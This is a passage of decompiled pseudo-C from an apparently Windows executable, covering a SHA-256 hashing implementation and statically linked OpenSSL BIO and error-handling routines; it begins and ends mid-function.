  int v53; // edi
  int v54; // ebx
  int v55; // ebp
  int v56; // [esp+0h] [ebp-A8h]
  int v57; // [esp+0h] [ebp-A8h]
  int v58; // [esp+0h] [ebp-A8h]
  unsigned int v59; // [esp+0h] [ebp-A8h]
  int v60; // [esp+0h] [ebp-A8h]
  int v61; // [esp+4h] [ebp-A4h]
  int v62; // [esp+4h] [ebp-A4h]
  int v63; // [esp+4h] [ebp-A4h]
  int v64; // [esp+4h] [ebp-A4h]
  int v65; // [esp+4h] [ebp-A4h]
  int v66; // [esp+8h] [ebp-A0h]
  int v67; // [esp+8h] [ebp-A0h]
  int v68; // [esp+8h] [ebp-A0h]
  int v69; // [esp+Ch] [ebp-9Ch]
  int v70; // [esp+Ch] [ebp-9Ch]
  int v71; // [esp+Ch] [ebp-9Ch]
  int v72; // [esp+Ch] [ebp-9Ch]
  int v73; // [esp+10h] [ebp-98h]
  int v74; // [esp+10h] [ebp-98h]
  int v75; // [esp+10h] [ebp-98h]
  int v76; // [esp+10h] [ebp-98h]
  int v77; // [esp+14h] [ebp-94h]
  int v78; // [esp+14h] [ebp-94h]
  int v79; // [esp+14h] [ebp-94h]
  int v80; // [esp+18h] [ebp-90h]
  int v81; // [esp+18h] [ebp-90h]
  int v82; // [esp+18h] [ebp-90h]
  int v83; // [esp+18h] [ebp-90h]
  int v84; // [esp+1Ch] [ebp-8Ch]
  int v85; // [esp+1Ch] [ebp-8Ch]
  _DWORD *v86; // [esp+1Ch] [ebp-8Ch]
  int v87; // [esp+20h] [ebp-88h]
  int v88; // [esp+20h] [ebp-88h]
  int v89; // [esp+20h] [ebp-88h]
  int v90; // [esp+20h] [ebp-88h]
  int *v91; // [esp+24h] [ebp-84h]
  int *v92; // [esp+24h] [ebp-84h]
  int *v93; // [esp+28h] [ebp-80h]
  int *v94; // [esp+2Ch] [ebp-7Ch]
  int *v95; // [esp+30h] [ebp-78h]
  int *v96; // [esp+30h] [ebp-78h]
  int *v97; // [esp+34h] [ebp-74h]
  int v98; // [esp+38h] [ebp-70h]
  int v99; // [esp+3Ch] [ebp-6Ch]
  int v100; // [esp+40h] [ebp-68h]
  int v101; // [esp+44h] [ebp-64h]
  int v102; // [esp+48h] [ebp-60h]
  int *v103; // [esp+4Ch] [ebp-5Ch]
  int *v104; // [esp+4Ch] [ebp-5Ch]
  int v105; // [esp+50h] [ebp-58h]
  int *v106; // [esp+54h] [ebp-54h]
  int v107; // [esp+58h] [ebp-50h]
  int v108; // [esp+5Ch] [ebp-4Ch]
  _DWORD *v109; // [esp+60h] [ebp-48h]
  unsigned int v110; // [esp+64h] [ebp-44h] BYREF
  unsigned int v111; // [esp+68h] [ebp-40h]
  unsigned int v112; // [esp+6Ch] [ebp-3Ch]
  unsigned int v113; // [esp+70h] [ebp-38h]
  unsigned int v114; // [esp+74h] [ebp-34h]
  unsigned int v115; // [esp+78h] [ebp-30h]
  unsigned int v116; // [esp+7Ch] [ebp-2Ch]
  unsigned int v117; // [esp+80h] [ebp-28h]
  unsigned int v118; // [esp+84h] [ebp-24h]
  unsigned int v119; // [esp+88h] [ebp-20h]
  unsigned int v120; // [esp+8Ch] [ebp-1Ch]
  unsigned int v121; // [esp+90h] [ebp-18h]
  unsigned int v122; // [esp+94h] [ebp-14h]
  unsigned int v123; // [esp+98h] [ebp-10h]
  unsigned int v124; // [esp+9Ch] [ebp-Ch]
  unsigned int v125; // [esp+A0h] [ebp-8h]

  result = a1;
  v109 = v2;
  if ( a2 )
  {
    v4 = v2[5];
    v98 = *v2;
    v99 = v2[1];
    v5 = v2[4];
    v6 = v2[6];
    v101 = v2[2];
    v108 = v2[3];
    v102 = v5;
    v100 = v4;
    v107 = v6;
    v105 = v2[7];
    do
    {
      --a2;
      v110 = _byteswap_ulong(*result);
      v56 = v105 + v110 + (__ROL4__(v5, 7) ^ __ROL4__(v5, 21) ^ __ROL4__(v5, 26)) + (v4 & v5 ^ v6 & ~v5) + 1116352408;
      v7 = v56 + (__ROL4__(v98, 10) ^ __ROL4__(v98, 19) ^ __ROL4__(v98, 30)) + (v98 & v99 ^ v101 & (v98 ^ v99));
      v111 = _byteswap_ulong(result[1]);
      v80 = v108 + v56;
      v8 = v111
         + (__ROL4__(v108 + v56, 7) ^ __ROL4__(v108 + v56, 21) ^ __ROL4__(v108 + v56, 26))
         + (v80 & v5 ^ v100 & ~v80)
         + v107
         + 1899447441;
      v61 = v8 + v101;
      v77 = v8 + (__ROL4__(v7, 10) ^ __ROL4__(v7, 19) ^ __ROL4__(v7, 30)) + (v98 & v99 ^ v7 & (v98 ^ v99));
      v112 = _byteswap_ulong(result[2]);
      v57 = v100
          + v112
          + (__ROL4__(v8 + v101, 7) ^ __ROL4__(v8 + v101, 21) ^ __ROL4__(v8 + v101, 26))
          + (v61 & (v108 + v56) ^ v5 & ~v61)
          - 1245643825;
      v84 = v57 + (__ROL4__(v77, 10) ^ __ROL4__(v77, 19) ^ __ROL4__(v77, 30)) + (v77 & v98 ^ v7 & (v77 ^ v98));
      v113 = _byteswap_ulong(result[3]);
      v9 = v113
         + (__ROL4__(v57 + v99, 7) ^ __ROL4__(v57 + v99, 21) ^ __ROL4__(v57 + v99, 26))
         + ((v57 + v99) & (v8 + v101) ^ v80 & ~(v57 + v99))
         + v102
         - 373957723;
      v10 = v9 + v98;
      v11 = v9 + (__ROL4__(v84, 10) ^ __ROL4__(v84, 19) ^ __ROL4__(v84, 30)) + (v84 & v77 ^ v7 & (v84 ^ v77));
      v114 = _byteswap_ulong(result[4]);
      v12 = v114
          + (__ROL4__(v10, 7) ^ __ROL4__(v10, 21) ^ __ROL4__(v10, 26))
          + (v10 & (v57 + v99) ^ (v8 + v101) & ~v10)
          + v80
          + 961987163;
      v73 = v12 + v7;
      v115 = _byteswap_ulong(result[5]);
      v13 = v12 + (__ROL4__(v11, 10) ^ __ROL4__(v11, 19) ^ __ROL4__(v11, 30)) + (v11 & v84 ^ v77 & (v11 ^ v84));
      v14 = v115
          + (__ROL4__(v73, 7) ^ __ROL4__(v12 + v7, 21) ^ __ROL4__(v12 + v7, 26))
          + (v10 & v73 ^ (v57 + v99) & ~v73)
          + v61
          + 1508970993;
      v15 = v14 + v77;
      v62 = v14 + (__ROL4__(v13, 10) ^ __ROL4__(v13, 19) ^ __ROL4__(v13, 30)) + (v13 & v11 ^ v84 & (v13 ^ v11));
      v116 = _byteswap_ulong(result[6]);
      v16 = __ROL4__(v14 + v77, 21) ^ __ROL4__(v14 + v77, 26);
      v78 = v15;
      v17 = v116 + (__ROL4__(v15, 7) ^ v16) + (v15 & v73 ^ v10 & ~v15) + v57 + v99 - 1841331548;
      v85 = v17 + v84;
      v66 = v17 + (__ROL4__(v62, 10) ^ __ROL4__(v62, 19) ^ __ROL4__(v62, 30)) + (v62 & v13 ^ v11 & (v62 ^ v13));
      v117 = _byteswap_ulong(result[7]);
      v18 = v10
          + v117
          + (__ROL4__(v85, 7) ^ __ROL4__(v85, 21) ^ __ROL4__(v85, 26))
          + (v85 & v15 ^ v73 & ~v85)
          - 1424204075;
      v87 = v18 + v11;
      v69 = v18 + (__ROL4__(v66, 10) ^ __ROL4__(v66, 19) ^ __ROL4__(v66, 30)) + (v66 & v62 ^ v13 & (v66 ^ v62));
      v118 = _byteswap_ulong(result[8]);
      v19 = v118
          + (__ROL4__(v87, 7) ^ __ROL4__(v87, 21) ^ __ROL4__(v87, 26))
          + (v87 & v85 ^ v78 & ~v87)
          + v73
          - 670586216;
      v119 = _byteswap_ulong(result[9]);
      v81 = v19 + v13;
      v74 = v19 + (__ROL4__(v69, 10) ^ __ROL4__(v69, 19) ^ __ROL4__(v69, 30)) + (v69 & v66 ^ v62 & (v69 ^ v66));
      v58 = v119
          + (__ROL4__(v81, 7) ^ __ROL4__(v81, 21) ^ __ROL4__(v81, 26))
          + (v81 & v87 ^ v85 & ~v81)
          + v78
          + 310598401;
      v20 = v58 + (__ROL4__(v74, 10) ^ __ROL4__(v74, 19) ^ __ROL4__(v74, 30)) + (v69 & v66 ^ v74 & (v69 ^ v66));
      v120 = _byteswap_ulong(result[10]);
      v21 = __ROL4__(v58 + v62, 21) ^ __ROL4__(v58 + v62, 26);
      v22 = __ROL4__(v58 + v62, 7);
      v63 = v58 + v62;
      v23 = v85 + v120 + (v22 ^ v21) + (v63 & v81 ^ v87 & ~v63) + 607225278;
      v67 = v23 + v66;
      v24 = v23 + (__ROL4__(v20, 10) ^ __ROL4__(v20, 19) ^ __ROL4__(v20, 30)) + (v69 & v20 ^ v74 & (v69 ^ v20));
      v121 = _byteswap_ulong(result[11]);
      v25 = v87
          + v121
          + (__ROL4__(v67, 7) ^ __ROL4__(v67, 21) ^ __ROL4__(v67, 26))
          + (v67 & v63 ^ v81 & ~v67)
          + 1426881987;
      v26 = v25 + v69;
      v88 = v25 + (__ROL4__(v24, 10) ^ __ROL4__(v24, 19) ^ __ROL4__(v24, 30)) + (v24 & v20 ^ v74 & (v24 ^ v20));
      v122 = _byteswap_ulong(result[12]);
      v27 = __ROL4__(v25 + v69, 21) ^ __ROL4__(v25 + v69, 26);
      v70 = v26;
      v28 = v122 + (__ROL4__(v26, 7) ^ v27) + (v26 & v67 ^ v63 & ~v26) + v81 + 1925078388;
      v75 = v28 + v74;
      v82 = v28 + (__ROL4__(v88, 10) ^ __ROL4__(v88, 19) ^ __ROL4__(v88, 30)) + (v88 & v24 ^ v20 & (v88 ^ v24));
      v123 = _byteswap_ulong(result[13]);
      v29 = v63
          + v123
          + (__ROL4__(v75, 7) ^ __ROL4__(v75, 21) ^ __ROL4__(v75, 26))
          + (v26 & v75 ^ v67 & ~v75)
          - 2132889090;
      v30 = v29 + v20;
      v124 = _byteswap_ulong(result[14]);
      v64 = v29 + (__ROL4__(v82, 10) ^ __ROL4__(v82, 19) ^ __ROL4__(v82, 30)) + (v82 & v88 ^ v24 & (v82 ^ v88));
      v31 = v124
          + (__ROL4__(v30, 7) ^ __ROL4__(v30, 21) ^ __ROL4__(v30, 26))
          + (v30 & v75 ^ v70 & ~v30)
          + v67
          - 1680079193;
      v32 = v31 + v24;
      v33 = v31 + (__ROL4__(v64, 10) ^ __ROL4__(v64, 19) ^ __ROL4__(v64, 30)) + (v64 & v82 ^ v88 & (v64 ^ v82));
      v125 = _byteswap_ulong(result[15]);
      result += 16;
      v34 = v125
          + (__ROL4__(v32, 7) ^ __ROL4__(v32, 21) ^ __ROL4__(v32, 26))
          + (v32 & v30 ^ v75 & ~v32)
          + v70
          - 1046744716;
      v89 = v34 + v88;
      v71 = v34 + (__ROL4__(v33, 10) ^ __ROL4__(v33, 19) ^ __ROL4__(v33, 30)) + (v33 & v64 ^ v82 & (v33 ^ v64));
      v35 = 17;
      v79 = 17;
      v86 = &unk_42CA0C;
      do
      {
        v95 = (int *)(&v110 + (v35 & 0xF));
        v103 = (int *)(&v110 + ((v35 - 3) & 0xF));
        v97 = (int *)(&v110 + ((v35 - 1) & 0xF));
        v36 = *v97
            + *(&v110 + ((v35 - 8) & 0xF))
            + (((unsigned int)*v95 >> 3) ^ __ROL4__(*v95, 14) ^ __ROL4__(*v95, 25))
            + (((unsigned int)*v103 >> 10) ^ __ROL4__(*v103, 13) ^ __ROL4__(*v103, 15));
        *v97 = v36;
        v37 = v75
            + v36
            + *(v86 - 1)
            + (v89 & v32 ^ v30 & ~v89)
            + (__ROL4__(v89, 7) ^ __ROL4__(v89, 21) ^ __ROL4__(v89, 26));
        v83 = v37 + v82;
        v76 = v37 + (__ROL4__(v71, 10) ^ __ROL4__(v71, 19) ^ __ROL4__(v71, 30)) + (v71 & v33 ^ v64 & (v71 ^ v33));
        v91 = (int *)(&v110 + (((_BYTE)v79 + 1) & 0xF));
        v106 = (int *)(&v110 + (((_BYTE)v79 - 2) & 0xF));
        v38 = *v95
            + *(&v110 + (((_BYTE)v79 - 7) & 0xF))
            + (((unsigned int)*v91 >> 3) ^ __ROL4__(*v91, 14) ^ __ROL4__(*v91, 25))
            + (((unsigned int)*v106 >> 10) ^ __ROL4__(*v106, 13) ^ __ROL4__(*v106, 15));
        *v95 = v38;
        v39 = v30 + *v86 + v38 + (__ROL4__(v83, 7) ^ __ROL4__(v83, 21) ^ __ROL4__(v83, 26)) + (v83 & v89 ^ v32 & ~v83);
        v65 = v39 + v64;
        v40 = v39 + (__ROL4__(v76, 10) ^ __ROL4__(v76, 19) ^ __ROL4__(v76, 30)) + (v71 & v33 ^ v76 & (v71 ^ v33));
        v94 = (int *)(&v110 + (((_BYTE)v79 + 2) & 0xF));
        v41 = *v91
            + *(&v110 + (((_BYTE)v79 - 6) & 0xF))
            + (((unsigned int)*v94 >> 3) ^ __ROL4__(*v94, 14) ^ __ROL4__(*v94, 25))
            + (((unsigned int)*v97 >> 10) ^ __ROL4__(*v97, 13) ^ __ROL4__(*v97, 15));
        *v91 = v41;
        v42 = v32 + v41 + v86[1] + (v65 & v83 ^ v89 & ~v65) + (__ROL4__(v65, 7) ^ __ROL4__(v65, 21) ^ __ROL4__(v65, 26));
        v43 = v42 + (__ROL4__(v40, 10) ^ __ROL4__(v40, 19) ^ __ROL4__(v40, 30)) + (v76 & (v71 ^ v40) ^ v40 & v71);
        v93 = (int *)(&v110 + (((_BYTE)v79 + 3) & 0xF));
        v68 = v42 + v33;
        v44 = *v94
            + *(&v110 + (((_BYTE)v79 - 5) & 0xF))
            + (((unsigned int)*v93 >> 3) ^ __ROL4__(*v93, 14) ^ __ROL4__(*v93, 25))
            + (((unsigned int)*v95 >> 10) ^ __ROL4__(*v95, 13) ^ __ROL4__(*v95, 15));
        *v94 = v44;
        v45 = v89 + v44 + v86[2] + (v68 & v65 ^ v83 & ~v68) + (__ROL4__(v68, 7) ^ __ROL4__(v68, 21) ^ __ROL4__(v68, 26));
        v72 = v45 + v71;
        v96 = (int *)(&v110 + (((_BYTE)v79 + 4) & 0xF));
        v90 = v45 + (__ROL4__(v43, 10) ^ __ROL4__(v43, 19) ^ __ROL4__(v43, 30)) + (v43 & v40 ^ v76 & (v43 ^ v40));
        v46 = *v93
            + *(&v110 + (((_BYTE)v79 - 4) & 0xF))
            + (((unsigned int)*v96 >> 3) ^ __ROL4__(*v96, 14) ^ __ROL4__(*v96, 25))
            + (((unsigned int)*v91 >> 10) ^ __ROL4__(*v91, 13) ^ __ROL4__(*v91, 15));
        *v93 = v46;
        v47 = v83 + v46 + v86[3] + (v72 & v68 ^ v65 & ~v72) + (__ROL4__(v72, 7) ^ __ROL4__(v72, 21) ^ __ROL4__(v72, 26));
        v75 = v47 + v76;
        v82 = v47 + (__ROL4__(v90, 10) ^ __ROL4__(v90, 19) ^ __ROL4__(v90, 30)) + (v90 & v43 ^ v40 & (v90 ^ v43));
        v92 = (int *)(&v110 + (((_BYTE)v79 + 5) & 0xF));
        v48 = *v96
            + *v103
            + (((unsigned int)*v92 >> 3) ^ __ROL4__(*v92, 14) ^ __ROL4__(*v92, 25))
            + (((unsigned int)*v94 >> 10) ^ __ROL4__(*v94, 13) ^ __ROL4__(*v94, 15));
        *v96 = v48;
        v49 = v65 + v48 + v86[4] + (v72 & v75 ^ v68 & ~v75) + (__ROL4__(v75, 7) ^ __ROL4__(v75, 21) ^ __ROL4__(v75, 26));
        v30 = v49 + v40;
        v64 = v49 + (__ROL4__(v82, 10) ^ __ROL4__(v82, 19) ^ __ROL4__(v82, 30)) + (v82 & v90 ^ v43 & (v82 ^ v90));
        v104 = (int *)(&v110 + (((_BYTE)v79 + 6) & 0xF));
        v50 = *v92
            + *v106
            + (((unsigned int)*v104 >> 3) ^ __ROL4__(*v104, 14) ^ __ROL4__(*v104, 25))
            + (((unsigned int)*v93 >> 10) ^ __ROL4__(*v93, 13) ^ __ROL4__(*v93, 15));
        *v92 = v50;
        v51 = v68 + v50 + v86[5] + (v30 & v75 ^ v72 & ~v30) + (__ROL4__(v30, 7) ^ __ROL4__(v30, 21) ^ __ROL4__(v30, 26));
        v32 = v51 + v43;
        v59 = *(&v110 + (((_BYTE)v79 + 7) & 0xF));
        v33 = v51 + (__ROL4__(v64, 10) ^ __ROL4__(v64, 19) ^ __ROL4__(v64, 30)) + (v90 & (v64 ^ v82) ^ v82 & v64);
        v52 = *v97
            + *v104
            + ((v59 >> 3) ^ __ROL4__(v59, 14) ^ __ROL4__(v59, 25))
            + (((unsigned int)*v96 >> 10) ^ __ROL4__(*v96, 13) ^ __ROL4__(*v96, 15));
        *v104 = v52;
        v53 = v72 + v52 + v86[6] + (v32 & v30 ^ v75 & ~v32) + (__ROL4__(v32, 7) ^ __ROL4__(v32, 21) ^ __ROL4__(v32, 26));
        v89 = v53 + v90;
        v60 = v53;
        v86 += 8;
        v35 = v79 + 8;
        v54 = (v33 & v64 ^ v82 & (v33 ^ v64)) + v60 + (__ROL4__(v33, 10) ^ __ROL4__(v33, 19) ^ __ROL4__(v33, 30));
        v55 = v79 + 7;
        v71 = v54;
        v79 += 8;
      }
      while ( v55 < 64 );
      v98 += v54;
      *v109 = v98;
      v4 = v32 + v100;
      v101 += v64;
      v109[2] = v101;
      v99 += v33;
      v108 += v82;
      v109[3] = v108;
      v5 = v89 + v102;
      v109[1] = v99;
      v6 = v30 + v107;
      v102 = v5;
      v109[4] = v5;
      v100 = v4;
      v109[5] = v4;
      v107 = v6;
      v109[6] = v6;
      v105 += v75;
      v109[7] = v105;
    }
    while ( a2 );
  }
  return result;
}
// 41BF47: variable 'v2' is possibly undefined

//----- (0041D000) --------------------------------------------------------
int __cdecl sub_41D000(_DWORD *a1, unsigned int *Src, size_t Size)
{
  size_t v3; // edi
  unsigned int *v4; // ebp
  size_t v5; // eax
  size_t v6; // ecx
  int v7; // eax
  _DWORD *v8; // ebp
  int v10; // ebx
  size_t v11; // ebx

  v3 = Size;
  v4 = Src;
  if ( Size )
  {
    v5 = a1[8];
    v6 = v5 + 8 * Size;
    if ( v6 < v5 )
      ++a1[9];
    a1[9] += Size >> 29;
    v7 = a1[26];
    a1[8] = v6;
    if ( v7 )
    {
      v8 = a1 + 10;
      if ( Size < 0x40 && v7 + Size < 0x40 )
      {
        memcpy((char *)v8 + v7, Src, Size);
        a1[26] += Size;
        return 1;
      }
      v10 = 64 - v7;
      memcpy((char *)v8 + v7, Src, 64 - v7);
      sub_41BF20(a1 + 10, 1);
      v3 = Size - v10;
      a1[26] = 0;
      memset(a1 + 10, 0, 0x40u);
      v4 = (unsigned int *)((char *)Src + v10);
    }
    if ( v3 >> 6 )
    {
      sub_41BF20(v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 = (unsigned int *)((char *)v4 + v11);
      v3 -= v11;
    }
    if ( v3 )
    {
      a1[26] = v3;
      memcpy(a1 + 10, v4, v3);
    }
  }
  return 1;
}

//----- (0041D0E0) --------------------------------------------------------
int __cdecl sub_41D0E0(_BYTE *a1, int *a2)
{
  int v2; // ebx
  unsigned int *v3; // edi
  unsigned int v4; // ebx
  unsigned int v5; // eax
  unsigned int v7; // edi
  _BYTE *v8; // eax
  int v9; // ecx
  int v10; // ecx
  int v11; // ecx
  int v12; // ecx
  int v13; // ecx
  int v14; // ecx
  int v15; // ecx
  int v16; // ecx
  int v17; // ecx
  int v18; // ecx
  int v19; // ecx
  int v20; // ecx
  int v21; // ecx
  int v22; // ecx
  int v23; // ecx
  int v24; // ecx

  v2 = a2[26];
  v3 = (unsigned int *)(a2 + 10);
  *((_BYTE *)a2 + v2 + 40) = 0x80;
  v4 = v2 + 1;
  if ( v4 > 0x38 )
  {
    memset((char *)v3 + v4, 0, 64 - v4);
    v4 = 0;
    sub_41BF20(v3, 1);
  }
  memset((char *)v3 + v4, 0, 56 - v4);
  *((_BYTE *)a2 + 96) = *((_BYTE *)a2 + 39);
  *((_BYTE *)a2 + 97) = *((_BYTE *)a2 + 38);
  *((_BYTE *)a2 + 98) = *((_BYTE *)a2 + 37);
  *((_BYTE *)a2 + 99) = *((_BYTE *)a2 + 36);
  *((_BYTE *)a2 + 100) = *((_BYTE *)a2 + 35);
  *((_BYTE *)a2 + 101) = *((_BYTE *)a2 + 34);
  *((_BYTE *)a2 + 102) = *((_BYTE *)a2 + 33);
  *((_BYTE *)a2 + 103) = *((_BYTE *)a2 + 32);
  sub_41BF20(v3, 1);
  a2[26] = 0;
  memset(v3, 0, 0x40u);
  v5 = a2[27];
  if ( v5 == 28 )
  {
    v18 = *a2;
    *a1 = HIBYTE(*a2);
    a1[1] = BYTE2(v18);
    a1[2] = BYTE1(v18);
    a1[3] = v18;
    v19 = a2[1];
    a1[4] = HIBYTE(v19);
    a1[5] = BYTE2(v19);
    a1[6] = BYTE1(v19);
    a1[7] = v19;
    v20 = a2[2];
    a1[8] = HIBYTE(v20);
    a1[9] = BYTE2(v20);
    a1[10] = BYTE1(v20);
    a1[11] = v20;
    v21 = a2[3];
    a1[12] = HIBYTE(v21);
    a1[13] = BYTE2(v21);
    a1[14] = BYTE1(v21);
    a1[15] = v21;
    v22 = a2[4];
    a1[16] = HIBYTE(v22);
    a1[17] = BYTE2(v22);
    a1[18] = BYTE1(v22);
    a1[19] = v22;
    v23 = a2[5];
    a1[20] = HIBYTE(v23);
    a1[21] = BYTE2(v23);
    a1[22] = BYTE1(v23);
    a1[23] = v23;
    v24 = a2[6];
    a1[24] = HIBYTE(v24);
    a1[25] = BYTE2(v24);
    a1[26] = BYTE1(v24);
    a1[27] = v24;
    return 1;
  }
  if ( v5 == 32 )
  {
    v10 = *a2;
    *a1 = HIBYTE(*a2);
    a1[1] = BYTE2(v10);
    a1[2] = BYTE1(v10);
    a1[3] = v10;
    v11 = a2[1];
    a1[4] = HIBYTE(v11);
    a1[5] = BYTE2(v11);
    a1[6] = BYTE1(v11);
    a1[7] = v11;
    v12 = a2[2];
    a1[8] = HIBYTE(v12);
    a1[9] = BYTE2(v12);
    a1[10] = BYTE1(v12);
    a1[11] = v12;
    v13 = a2[3];
    a1[12] = HIBYTE(v13);
    a1[13] = BYTE2(v13);
    a1[14] = BYTE1(v13);
    a1[15] = v13;
    v14 = a2[4];
    a1[16] = HIBYTE(v14);
    a1[17] = BYTE2(v14);
    a1[18] = BYTE1(v14);
    a1[19] = v14;
    v15 = a2[5];
    a1[20] = HIBYTE(v15);
    a1[21] = BYTE2(v15);
    a1[22] = BYTE1(v15);
    a1[23] = v15;
    v16 = a2[6];
    a1[24] = HIBYTE(v16);
    a1[25] = BYTE2(v16);
    a1[26] = BYTE1(v16);
    a1[27] = v16;
    v17 = a2[7];
    a1[28] = HIBYTE(v17);
    a1[29] = BYTE2(v17);
    a1[30] = BYTE1(v17);
    a1[31] = v17;
    return 1;
  }
  if ( v5 > 0x20 )
    return 0;
  v7 = 0;
  if ( (v5 & 0xFFFFFFFC) == 0 )
    return 1;
  v8 = a1;
  do
  {
    v9 = a2[v7];
    *v8 = HIBYTE(v9);
    v8[1] = BYTE2(v9);
    v8[2] = BYTE1(v9);
    v8[3] = v9;
    ++v7;
    v8 += 4;
  }
  while ( v7 < (unsigned int)a2[27] >> 2 );
  return 1;
}

//----- (0041D3C0) --------------------------------------------------------
int __cdecl sub_41D3C0(int a1, int a2)
{
  int result; // eax

  result = a1;
  *(_DWORD *)(a1 + 20) &= ~a2;
  return result;
}

//----- (0041D3D0) --------------------------------------------------------
void __cdecl sub_41D3D0(_DWORD *Block)
{
  _DWORD *v1; // edi
  int v2; // ebx
  _DWORD *v3; // eax
  int v4; // esi
  int (__cdecl *v5)(int, int, _DWORD, _DWORD, _DWORD, int); // eax
  void (__cdecl *v6)(int); // eax

  v1 = Block;
  if ( Block )
  {
    do
    {
      v2 = v1[11];
      v3 = v1 + 11;
      v4 = (int)v1;
      v1 = (_DWORD *)v1[9];
      if ( sub_41E340(v3, -1, 21, (int)".\\crypto\\bio\\bio_lib.c", 113) <= 0 )
      {
        v5 = *(int (__cdecl **)(int, int, _DWORD, _DWORD, _DWORD, int))(v4 + 4);
        if ( !v5 || v5(v4, 1, 0, 0, 0, 1) > 0 )
        {
          sub_41DE60(0xDu, v4, (int **)(v4 + 64));
          if ( *(_DWORD *)v4 )
          {
            v6 = *(void (__cdecl **)(int))(*(_DWORD *)v4 + 32);
            if ( v6 )
              v6(v4);
          }
          sub_41E130((void *)v4);
        }
      }
    }
    while ( v2 <= 1 && v1 );
  }
}

//----- (0041D460) --------------------------------------------------------
_BYTE *__cdecl sub_41D460(unsigned int *Src, size_t Size, _BYTE *a3)
{
  _BYTE *v3; // esi
  _BYTE *result; // eax
  int Buf[24]; // [esp+8h] [ebp-64h] BYREF

  v3 = a3;
  if ( !a3 )
    v3 = &unk_4531A0;
  result = (_BYTE *)sub_41E390(Buf);
  if ( result )
  {
    sub_41F920(Buf, Src, Size);
    sub_41FA00(v3, (int)Buf);
    sub_41DD70(Buf, 0x60u);
    return v3;
  }
  return result;
}
// 41D460: using guessed type int Buf[24];

//----- (0041D4F0) --------------------------------------------------------
void sub_41D4F0()
{
  sub_41DBE0();
  sub_420020();
  sub_41FFF0();
  sub_41FFC0();
  sub_41FF90();
  sub_41FF60();
  sub_41FF30();
  sub_41FF00();
  sub_41FED0();
  sub_41FEA0();
  sub_41FE70();
  sub_41FE40();
  sub_41FE10();
  sub_41FDE0();
  sub_41FDB0();
  sub_41FD80();
  sub_41FD50();
  sub_41FD20();
  sub_41FCF0();
  sub_41FCC0();
  sub_41FC90();
  sub_41FC60();
  sub_41FC30();
  sub_41FC00();
  sub_41FBD0();
  sub_41FBA0();
  sub_41FB70();
  if ( !sub_41D930(dword_44C878) )
  {
    sub_41DC20(0, &dword_44C878);
    sub_41DC20(0, &dword_44C8B0);
  }
}
// 44C878: using guessed type int dword_44C878;
// 44C8B0: using guessed type _DWORD dword_44C8B0;

//----- (0041D5C0) --------------------------------------------------------
int __cdecl sub_41D5C0(_DWORD *a1, _DWORD *a2)
{
  return *a1 - *a2;
}

//----- (0041D600) --------------------------------------------------------
_DWORD *__cdecl sub_41D600(int a1)
{
  _DWORD *v1; // edi
  int v2; // esi

  v1 = 0;
  sub_41E2C0(5, 1, (int)".\\crypto\\err\\err.c", 367);
  v2 = 0;
  if ( dword_45482C )
  {
    ++dword_454830;
    v2 = dword_45482C;
    v1 = sub_420870(dword_45482C, a1);
  }
  sub_41E2C0(6, 1, (int)".\\crypto\\err\\err.c", 371);
  if ( v2 )
    sub_41E340(&dword_454830, -1, 1, (int)".\\crypto\\err\\err.c", 346);
  return v1;
}
// 45482C: using guessed type int dword_45482C;
// 454830: using guessed type int dword_454830;

//----- (0041D680) --------------------------------------------------------
_DWORD *__cdecl sub_41D680(int a1)
{
  _DWORD *v1; // edi
  unsigned int *v2; // eax
  unsigned int *v3; // esi

  v1 = 0;
  sub_41E2C0(9, 1, (int)".\\crypto\\err\\err.c", 382);
  v2 = (unsigned int *)dword_45482C;
  v3 = 0;
  if ( dword_45482C
    || (sub_420190((int)"int_thread_get (err.c)", (int)".\\crypto\\err\\err.c", 326),
        dword_45482C = (int)sub_4206F0(
                              (int (__cdecl *)(char *))sub_41D5D0,
                              (int (__cdecl *)(const char *, const char *))sub_41D5F0),
        sub_420360(),
        (v2 = (unsigned int *)dword_45482C) != 0) )
  {
    ++dword_454830;
    v3 = v2;
    if ( v2 )
      v1 = sub_420770(v2, a1);
  }
  sub_41E2C0(10, 1, (int)".\\crypto\\err\\err.c", 386);
  if ( v3 )
    sub_41E340(&dword_454830, -1, 1, (int)".\\crypto\\err\\err.c", 346);
  return v1;
}
// 41D5D0: using guessed type int sub_41D5D0();
// 45482C: using guessed type int dword_45482C;
// 454830: using guessed type int dword_454830;

//----- (0041D740) --------------------------------------------------------
void sub_41D740()
{
  int v0; // ebp
  char *v1; // edi
  char **v2; // esi
  bool v3; // zf
  char *v4; // eax

  sub_41E2C0(5, 1, (int)".\\crypto\\err\\err.c", 438);
  if ( dword_44C84C )
  {
    sub_41E2C0(6, 1, (int)".\\crypto\\err\\err.c", 444);
    sub_41E2C0(9, 1, (int)".\\crypto\\err\\err.c", 445);
    if ( dword_44C84C )
    {
      v0 = 1;
      v1 = byte_4531B8;
      v2 = (char **)&unk_45419C;
      do
      {
        v3 = *v2 == 0;
        *(v2 - 1) = (char *)v0;
        if ( v3 )
        {
          v4 = strerror(v0);
          if ( v4 )
          {
            strncpy(v1, v4, 0x20u);
            v1[31] = 0;
            *v2 = v1;
          }
          if ( !*v2 )
            *v2 = "unknown";
        }
        v2 += 2;
        ++v0;
        v1 += 32;
      }
      while ( (int)v2 <= (int)&unk_45458C );
      dword_44C84C = 0;
      sub_41E2C0(10, 1, (int)".\\crypto\\err\\err.c", 475);
    }
    else
    {
      sub_41E2C0(10, 1, (int)".\\crypto\\err\\err.c", 447);
    }
  }
  else
  {
    sub_41E2C0(6, 1, (int)".\\crypto\\err\\err.c", 440);
  }
}
// 44C84C: using guessed type int dword_44C84C;

//----- (0041D840) --------------------------------------------------------
int (__cdecl *__cdecl sub_41D840(char *Block))(_DWORD, _DWORD)
{
  _BYTE *v1; // esi
  int v2; // edi
  int (__cdecl *result)(_DWORD, _DWORD); // eax

  if ( Block )
  {
    v1 = Block + 200;
    v2 = 16;
    do
    {
      if ( (*v1 & 1) != 0 )
      {
        sub_41E130(*((void **)v1 - 16));
        *((_DWORD *)v1 - 16) = 0;
      }
      *(_DWORD *)v1 = 0;
      v1 += 4;
      --v2;
    }
    while ( v2 );
    return sub_41E130(Block);
  }
  return result;
}

//----- (0041D890) --------------------------------------------------------
void __usercall sub_41D890(_DWORD *a1@<ecx>, int a2@<ebx>)
{
  int v3; // eax
  unsigned int *v4; // edi

  sub_41E2C0(9, 1, (int)".\\crypto\\err\\err.c", 526);
  v3 = dword_454828;
  if ( dword_454828
    || (sub_420190((int)"get_hash (err.c)", (int)".\\crypto\\err\\err.c", 279),
